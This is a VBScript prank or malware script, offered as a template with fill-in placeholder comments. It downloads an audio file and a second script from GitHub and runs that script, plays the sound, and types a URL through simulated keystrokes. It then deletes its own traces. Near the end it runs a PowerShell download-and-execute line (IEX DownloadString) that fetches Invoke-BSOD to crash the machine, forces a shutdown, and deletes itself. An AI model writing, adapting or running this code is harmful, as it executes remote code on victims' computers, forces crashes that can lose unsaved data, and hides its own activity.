set WshShell = CreateObject("WScript.Shell")
Set objWinHttp = CreateObject("WinHttp.WinHttpRequest.5.1")
Dim oPlayer
Set oPlayer = CreateObject("WMPlayer.OCX")
Set obj = CreateObject("Scripting.FileSystemObject")
Set Keys = CreateObject("WScript.Shell")
strScript = Wscript.ScriptFullName

'delay in ms
WScript.Sleep 5000

'download sound
URL = "https://github.com/greisenmeisen/legendary-invention/raw/main/r7.mp3" '<--- put the url to your sound in the ""
objWinHttp.open "GET", URL, False
objWinHttp.send ""
SaveBinaryData "r7.mp3",objWinHttp.responseBody '<--- put your audio file name in the ""
WScript.Sleep 500

'download volume script
URL = "https://raw.githubusercontent.com/greisenmeisen/legendary-invention/main/vol.vbs"
objWinHttp.open "GET", URL, False
objWinHttp.send ""
SaveBinaryData "vol.vbs",objWinHttp.responseBody
WScript.Sleep 500
CreateObject("WScript.Shell").Run "vol.vbs"

'audio player
oPlayer.URL = "r7.mp3" '<--- enter your audio file name in the ""
oPlayer.controls.play 
While oPlayer.playState <> 1
  WScript.Sleep 16000 '<--- enter the duration of the sound in ms
Wend
oPlayer.close

Keys.SendKeys("^{Esc}")
WScript.Sleep 500
WshShell.SendKeys "github.com/xcuzimfna"

'end
obj.DeleteFile("r7.mp3") '<-- put your audio file name here
obj.DeleteFile("vol.vbs")
WScript.Sleep 500
CreateObject("WScript.Shell").Run "powershell IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD" 
CreateObject("WScript.Shell").Run "shutdown -s -t 5"
Set oFso = CreateObject("Scripting.FileSystemObject") : oFso.DeleteFile Wscript.ScriptFullName, True


Function SaveBinaryData(FileName, Data)
Const adTypeText = 1
Const adSaveCreateOverWrite = 2
Dim BinaryStream
Set BinaryStream = CreateObject("ADODB.Stream")
BinaryStream.Type = adTypeText
BinaryStream.Open
BinaryStream.Write Data
BinaryStream.SaveToFile FileName, adSaveCreateOverWrite
End Function
